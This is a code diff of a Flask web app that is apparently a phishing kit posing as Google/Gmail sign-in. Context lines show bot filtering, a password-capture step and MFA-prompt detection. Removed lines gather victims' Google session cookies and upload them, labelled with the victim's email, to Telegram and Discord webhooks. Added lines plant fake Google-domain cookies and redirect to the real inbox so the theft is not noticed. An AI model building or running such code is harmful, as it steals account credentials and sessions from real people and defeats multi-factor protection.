@@ -14,7 +14,6 @@ import datetime
 
 
 
-
 # Initialize Flask application first
 app = Flask(__name__)
 app.secret_key = "2d300b06dba345980bcb37ccb46e803a1bf3c71be31a6ffdfb6e9b867beee25b"
@@ -97,106 +96,25 @@ class Browser:
 # Cookie handling function
 def cookies_to_json(cookies):
     cookie_list = []
-    for cookie in cookies:
-        cookie_dict = {
-            'name': cookie.name,
-            'value': cookie.value,
-            'domain': cookie.domain,
-            'path': cookie.path,
-            'secure': cookie.secure,
-            'expires': cookie.expires,
-            'httpOnly': cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
-            'sameSite': cookie.has_nonstandard_attr('SameSite') if hasattr(cookie, 'has_nonstandard_attr') else None,
-            'priority': cookie.has_nonstandard_attr('Priority') if hasattr(cookie, 'has_nonstandard_attr') else None,
-            'hostOnly': cookie.domain_specified if hasattr(cookie, 'domain_specified') else False,
-            'max-age': cookie.has_nonstandard_attr('Max-Age') if hasattr(cookie, 'has_nonstandard_attr') else None
-        }
-        cookie_list.append(cookie_dict)
-    return json.dumps(cookie_list)
-
-def cookieToJSON(cookie_string, domain):
-    cookie_parts = cookie_string.split(';')
-    main_part = cookie_parts[0].strip()
-    name, value = main_part.split('=', 1)
-
-    cookie_dict = {
-        'name': name,
-        'value': value,
-        'domain': domain,
-        'path': '/',  # Default path
-        'secure': False,
-        'expires': None,
-        'httpOnly': False,
-        'sameSite': None,
-        'priority': None,
-        'hostOnly': False,
-        'max-age': None
-    }
-
-    for part in cookie_parts[1:]:
-        part = part.strip()
-        lower_part = part.lower()
-        if 'secure' == lower_part:
-            cookie_dict['secure'] = True
-        elif 'httponly' == lower_part:
-            cookie_dict['httpOnly'] = True
-        elif 'path=' in lower_part:
-            cookie_dict['path'] = part.split('=', 1)[1]
-        elif 'expires=' in lower_part:
-            cookie_dict['expires'] = part.split('=', 1)[1]
-        elif 'max-age=' in lower_part:
-            cookie_dict['max-age'] = part.split('=', 1)[1]
-        elif 'samesite=' in lower_part:
-            cookie_dict['sameSite'] = part.split('=', 1)[1]
-        elif 'priority=' in lower_part:
-            cookie_dict['priority'] = part.split('=', 1)[1]
-    return cookie_dict
-
-# Dummy response function for testing
-def get_dummy_response():
-    class DummyResponse:
-        def __init__(self):
-            self.headers = {
-                'Set-Cookie': 'sessionid=abc123; Path=/; Secure; HttpOnly, userid=xyz789; Path=/; Max-Age=3600; SameSite=Lax'
-            }
-            self.status_code = 200
-            self.text = '{"message": "Dummy response"}'
-    return DummyResponse()
-
-# Example usage to send cookies in cookie message
-def send_cookie_message():
-    response = get_dummy_response()
-    set_cookie_header = response.headers.get('Set-Cookie', '')
-    domain = 'example.com'
-    cookie_json_list = []
-    for cookie_str in set_cookie_header.split(','):
-        cookie_json = cookieToJSON(cookie_str.strip(), domain)
-        cookie_json_list.append(cookie_json)
-    # Send or print the cookie message in the required format
-    cookie_message = {
-        'cookies': cookie_json_list
-    }
-    print('Cookie Message:', cookie_message)
-# Email validation for Gmail and Google Workspace
-def is_valid_email(email):
-    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
-    if not re.match(email_regex, email):
-        return False
-    domain = email.lower().split('@')[1] if '@' in email else ''
-    # Allow gmail.com and googlemail.com
-    if domain in ['gmail.com', 'googlemail.com']:
-        return True
-    # Check if domain is a Google Workspace domain (simulate with DNS MX lookup for 'aspmx.l.google.com')
     try:
-        import dns.resolver
-        answers = dns.resolver.resolve(domain, 'MX')
-        for rdata in list(answers):
-            # rdata.exchange is available in each answer
-            if hasattr(rdata, 'exchange') and 'aspmx.l.google.com' in str(rdata.exchange):
-                return True
+        for cookie in cookies:
+            cookie_dict = {
+                'name': cookie.name,
+                'value': cookie.value,
+                'domain': cookie.domain,
+                'path': cookie.path,
+                'secure': cookie.secure,
+                'expires': cookie.expires,
+                'httpOnly': cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
+                'sameSite': cookie.has_nonstandard_attr('SameSite') if hasattr(cookie, 'has_nonstandard_attr') else None,
+                'priority': cookie.has_nonstandard_attr('Priority') if hasattr(cookie, 'has_nonstandard_attr') else None,
+                'hostOnly': cookie.domain_specified if hasattr(cookie, 'domain_specified') else False,
+                'max-age': cookie.has_nonstandard_attr('Max-Age') if hasattr(cookie, 'has_nonstandard_attr') else None
+            }
+            cookie_list.append(cookie_dict)
     except Exception:
         pass
-    return False
+    return cookie_list
 
 # Bot detection and redirect
 def is_bot_request():
@@ -379,7 +297,7 @@ def enter_password():
 
         # Phone/MFA approval detection
         phone_keywords = [
-            "challenge", "phone", "2-step", "approval", "verify", "verification", "security check", "confirm it's you", "identity", "prompt", "notification", "app", "open your phone", "check your phone", "enter code", "sent a code", "authenticator", "multi-factor", "mfa", "device", "trusted device", "push notification", "verify its you"
+            "challenge", "2SV", "2-step", "2-step verification", "verify", "verification", "security check", "confirm it's you", "identity", "prompt", "notification", "app", "open your phone", "check your phone", "enter code", "sent a code", "authenticator", "multi-factor", "mfa", "device", "trusted device", "push notification", "verify its you"
         ]
         phone_detected = any(kw in response.text.lower() for kw in phone_keywords)
         if phone_detected:
@@ -460,87 +378,41 @@ def enter_password():
         return render_template('password.html', email=email, error=error, branding=branding)
 
 # Step 3: Show authentication code/token in auth.html
-@app.route('/auth')
+
+# Add POST handling for code confirmation
+@app.route('/auth', methods=['GET', 'POST'])
 def auth():
-    if not session.get('authenticated'):
-        return redirect(url_for('index'))
-    email = session.get('email', '')
-    code = session.get('auth_code') or str(random.randint(10, 99))
-    session['auth_code'] = code
-
-    # Set cookies using user agent and notify webhook before redirect
-    is_https = request.headers.get('X-Forwarded-Proto', '').lower() == 'https'
-    domain = request.host
-    user_agent = request.headers.get('User-Agent', '')
-    resp = make_response(render_template('auth.html', email=email, code=code))
-    resp.set_cookie('auth_verified', '1', secure=is_https, samesite='Strict')
-    resp.set_cookie('user_agent', user_agent, secure=is_https, samesite='Strict')
-
-    # Prepare cookies for webhook in Cookie2json format
-    # Only include Google login cookies (gmail.com, google.com) from previous login session
-    cookies_json = []
-    google_cookies = []
-    # Try to get cookies from previous login session (if available)
-    if 'login_cookies' in session:
-        for c in session['login_cookies']:
-            if any(d in c.get('domain', '') for d in ['gmail.com', 'google.com']):
-                google_cookies.append(c)
-    # Fallback: try to get from request cookies (not ideal, but for completeness)
-    for k, v in request.cookies.items():
-        if any(d in domain for d in ['gmail.com', 'google.com']):
-            google_cookies.append(cookieToJSON(f"{k}={v}; Path=/; Secure; SameSite=Strict", domain))
-    # Add Google cookies only
-    cookies_json.extend(google_cookies)
-
-    # Save cookies to txt file named with user email
-    safe_email = email.replace('@', '_at_').replace('.', '_dot_')
-    temp_file_path = os.path.join(tempfile.gettempdir(), f"{safe_email}_cookies.txt")
-    cookies_str = json.dumps(cookies_json, indent=2)
-    # Telegram/Discord file size limit (Telegram: 50MB, Discord: 8MB for free)
-    max_size = 8 * 1024 * 1024
-    try:
-        if len(cookies_str.encode('utf-8')) < max_size:
-            with open(temp_file_path, 'w') as f:
-                f.write(cookies_str)
-        else:
-            with open(temp_file_path, 'w') as f:
-                f.write(cookies_str[:max_size])
-    except Exception as e:
-        print(f"[ERROR] Could not write cookies file: {e}")
-
-
-    # Send file to Telegram (document upload)
-    try:
-        if TELEGRAM_WEBHOOK_ON and TELEGRAM_CHAT_ID and os.path.exists(temp_file_path):
-            with open(temp_file_path, 'rb') as doc_file:
-                files = {'document': doc_file}
-                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f'Cookies for {email}'}
-                r = requests.post(f'https://api.telegram.org/bot{TELEGRAM_WEBHOOK_URL.split("bot")[1].split(":")[0]}/sendDocument', data=data, files=files, timeout=10)
-                print(f"[DEBUG] Telegram file upload status: {r.status_code}")
-    except Exception as e:
-        print(f"[ERROR] Telegram file upload failed: {e}")
-
-    # Send file to Discord (document upload)
-    try:
-        if DISCORD_WEBHOOK_ON and os.path.exists(temp_file_path):
-            with open(temp_file_path, 'rb') as doc_file:
-                files = {'file': (f'{safe_email}_cookies.txt', doc_file)}
-                data = {'content': f'Cookies for {email}'}
-                r = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=10)
-                print(f"[DEBUG] Discord file upload status: {r.status_code}")
-    except Exception as e:
-        print(f"[ERROR] Discord file upload failed: {e}")
-
-    # Clean up session after authentication
-    session.pop('email', None)
-    session.pop('authenticated', None)
-    session.pop('google_token', None)
-    session.pop('id_token', None)
-    session.pop('branding', None)
-    session.pop('auth_code', None)
-
-    # After showing the code, redirect to Gmail inbox (simulate Google flow)
-    return redirect('https://mail.google.com/mail/u/0/')
+    if request.method == 'GET':
+        if not session.get('authenticated'):
+            return redirect(url_for('index'))
+        email = session.get('email', '')
+        code = session.get('auth_code') or str(random.randint(10, 99))
+        session['auth_code'] = code
+        return render_template('auth.html', email=email, code=code)
+    elif request.method == 'POST':
+        user_code = request.form.get('code')
+        expected_code = session.get('auth_code')
+        email = session.get('email', '')
+        if user_code and expected_code and user_code == expected_code:
+            resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
+            # Set persistent cookies for Google/Gmail domains
+            expires = datetime.datetime.now() + datetime.timedelta(days=30)
+            resp.set_cookie('G_AUTHUSER_H', '0', domain='.google.com', secure=True, samesite='Lax', expires=expires)
+            resp.set_cookie('GMAIL_LOGIN', '1', domain='.gmail.com', secure=True, samesite='Lax', expires=expires)
+            resp.set_cookie('auth_verified', '1', domain='.google.com', secure=True, samesite='Lax', expires=expires)
+            resp.set_cookie('user_email', email, domain='.google.com', secure=True, samesite='Lax', expires=expires)
+            # Clean up session
+            session.pop('email', None)
+            session.pop('authenticated', None)
+            session.pop('google_token', None)
+            session.pop('id_token', None)
+            session.pop('branding', None)
+            session.pop('auth_code', None)
+            return resp
+        # If code is wrong, re-render with error
+        error = 'Incorrect code. Please try again.'
+        code = expected_code or ''
+        return render_template('auth.html', email=email, code=code, error=error)
 
 # After each request, capture Set-Cookie headers if needed
 @app.after_request
